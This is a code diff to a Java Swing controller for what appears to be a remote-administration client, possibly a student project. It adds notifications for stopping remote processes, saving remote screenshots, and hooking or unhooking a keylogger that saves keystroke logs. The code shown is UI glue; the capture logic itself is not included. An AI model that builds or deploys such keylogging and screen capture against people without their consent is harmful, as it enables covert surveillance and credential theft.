@@ -3,6 +3,8 @@ package controller;
 import model.Client;
 import view.Login;
 import view.Home;
+
+import javax.swing.*;
 import java.awt.image.BufferedImage;
 import java.util.ArrayList;
 
@@ -54,13 +56,33 @@ public class Controller
                 break;
             }
 
-            case ("StopProcess"):
-            {
-                String IDProcess = home.getProcessPanel().getClickedProcessID();
+            case ("StopProcess"): {
+                String IDProcess = home.getProcessPanel().getClickedProcessID().trim();
+                String NameProcess = home.getProcessPanel().getClickedProcessName().trim();
                 String notifyStopStatus = client.getProcess().stopProcess(IDProcess);
                 notifyStopStatus = notifyStopStatus.trim();
+                try {
+                    Thread.sleep(1500);
+                } catch (InterruptedException iE) {
+                    //
+                }
 
-                System.out.println(notifyStopStatus);
+                switch (notifyStopStatus)
+                {
+                    case "1":
+                    {
+                        home.notify("Process", "      " + NameProcess + " (" + IDProcess + ") has been stopped      ");
+                        break;
+                    }
+                    case "0":
+                    {
+                        home.notify("Process", "      There is no " + NameProcess + " (" + IDProcess + ") is running      ");
+                        break;
+                    }
+                }
+
+                handleProcess("ListProcess");
+                break;
             }
         }
     }
@@ -73,23 +95,38 @@ public class Controller
         }
 
         BufferedImage image = client.handleScreenShot(command);
+        int currentFileName = client.getScreenShot().getCurrentFileName();
+        home.getScreenPanel().addImageLabel(image);
+        home.notify("Screenshot", "   Screenshot has been saved as \"screenshot" + Integer.toString(currentFileName) + ".jpg   ");
 
-//        try
-//        {
-            //ImageIO.write(image, "jpg", new File("./screenshot/image.jpg"));
-
-            home.getScreenPanel().addImageLabel(image);
-//        }
-//        catch (IOException ioE)
-//        {
-//            ioE.printStackTrace();
-//        }
+        client.getScreenShot().setCurrentFileName(currentFileName + 1);
 
         firstTakeScreen = false;
     }
     private void handleKeyLogger(String command)
     {
         String keylogger = client.handleKeyLogger(command);
+
+        switch (command)
+        {
+            case "Hook":
+            {
+                home.getLogPanel().getHookButton().setForeground(new java.awt.Color(40, 50, 65));
+                home.getLogPanel().getHookButton().setBackground(new java.awt.Color(130, 197, 190));
+                home.getLogPanel().setHook(true);
+                break;
+            }
+            case "Unhook":
+            {
+                home.getLogPanel().getHookButton().setBackground(new java.awt.Color(40, 50, 65));
+                home.getLogPanel().getHookButton().setForeground(new java.awt.Color(130, 197, 190));
+                home.getLogPanel().setHook(false);
+                int fileName = client.getKeylogger().getCurrentFileName();
+                home.notify("Keylogger", "      Keylogging has been saved as \"keylog" + Integer.toString(fileName) +".txt\"!      ");
+                client.getKeylogger().setCurrentFileName(fileName + 1);
+                break;
+            }
+        }
 
         home.getLogPanel().getKeyTextArea().setText(keylogger);
     }
